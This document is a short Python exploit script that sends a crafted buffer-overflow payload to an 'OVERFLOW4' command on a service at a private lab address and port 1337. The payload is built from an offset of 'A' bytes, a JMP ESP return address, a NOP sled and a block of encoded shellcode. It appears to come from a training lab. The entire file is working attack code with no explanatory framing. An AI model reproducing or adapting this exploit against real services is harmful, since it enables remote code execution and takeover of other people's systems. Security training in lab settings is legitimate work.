#! /usr/bin/python3

import socket

IP = '192.168.56.1'
PORT = 1337

prefix = b'OVERFLOW4 '
offset = 2026
overflow = b'A' * offset
retn = b'\xaf\x11\x50\x62'  #jmp esp 0x625011af
padding = b'\x90' * 32

#badchars x00\xa9\xcd\xd4

shellcode =  b'\xda\xc1\xbb\xf2\x19\x04\x1b\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x52\x31\x5f\x17\x83\xef\xfc\x03\xad\x0a\xe6\xee\xad\xc5\x64\x10\x4d\x16\x09\x98\xa8\x27\x09\xfe\xb9\x18\xb9\x74\xef\x94\x32\xd8\x1b\x2e\x36\xf5\x2c\x87\xfd\x23\x03\x18\xad\x10\x02\x9a\xac\x44\xe4\xa3\x7e\x99\xe5\xe4\x63\x50\xb7\xbd\xe8\xc7\x27\xc9\xa5\xdb\xcc\x81\x28\x5c\x31\x51\x4a\x4d\xe4\xe9\x15\x4d\x07\x3d\x2e\xc4\x1f\x22\x0b\x9e\x94\x90\xe7\x21\x7c\xe9\x08\x8d\x41\xc5\xfa\xcf\x86\xe2\xe4\xa5\xfe\x10\x98\xbd\xc5\x6b\x46\x4b\xdd\xcc\x0d\xeb\x39\xec\xc2\x6a\xca\xe2\xaf\xf9\x94\xe6\x2e\x2d\xaf\x13\xba\xd0\x7f\x92\xf8\xf6\x5b\xfe\x5b\x96\xfa\x5a\x0d\xa7\x1c\x05\xf2\x0d\x57\xa8\xe7\x3f\x3a\xa5\xc4\x0d\xc4\x35\x43\x05\xb7\x07\xcc\xbd\x5f\x24\x85\x1b\x98\x4b\xbc\xdc\x36\xb2\x3f\x1d\x1f\x71\x6b\x4d\x37\x50\x14\x06\xc7\x5d\xc1\x89\x97\xf1\xba\x69\x47\xb2\x6a\x02\x8d\x3d\x54\x32\xae\x97\xfd\xd9\x55\x70\xc2\xb6\x6d\xea\xaa\xc4\x8d\xeb\x91\x40\x6b\x81\xf5\x04\x24\x3e\x6f\x0d\xbe\xdf\x70\x9b\xbb\xe0\xfb\x28\x3c\xae\x0b\x44\x2e\x47\xfc\x13\x0c\xce\x03\x8e\x38\x8c\x96\x55\xb8\xdb\x8a\xc1\xef\x8c\x7d\x18\x65\x21\x27\xb2\x9b\xb8\xb1\xfd\x1f\x67\x02\x03\x9e\xea\x3e\x27\xb0\x32\xbe\x63\xe4\xea\xe9\x3d\x52\x4d\x40\x8c\x0c\x07\x3f\x46\xd8\xde\x73\x59\x9e\xde\x59\x2f\x7e\x6e\x34\x76\x81\x5f\xd0\x7e\xfa\xbd\x40\x80\xd1\x05\x70\xcb\x7b\x2f\x19\x92\xee\x6d\x44\x25\xc5\xb2\x71\xa6\xef\x4a\x86\xb6\x9a\x4f\xc2\x70\x77\x22\x5b\x15\x77\x91\x5c\x3c'
payload = prefix + overflow + retn + padding + shellcode
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(3)
        s.connect((IP, PORT))
        print('Sending evil buffer...')
        s.send(payload)
        print('Done!')
except:
    print('Could not connect to remote host')